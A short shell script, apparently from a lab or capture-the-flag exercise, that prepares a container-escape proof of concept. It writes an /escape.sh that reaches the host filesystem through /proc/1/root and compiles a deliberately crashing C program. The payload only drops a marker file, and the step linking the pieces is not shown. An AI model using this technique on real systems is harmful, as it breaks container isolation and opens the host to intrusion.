# Create a escape
cat <<EOF > /escape.sh
#!/bin/sh
echo "Arcane magic!" > /proc/1/root/tmp/hex_crystal
EOF
chmod +x /escape.sh

# Create a crasher
cat <<EOF > crash.c
int main(void) {
    int *p = 0;
    *p = 1;
    return 0;
}
EOF

gcc crash.c -o crash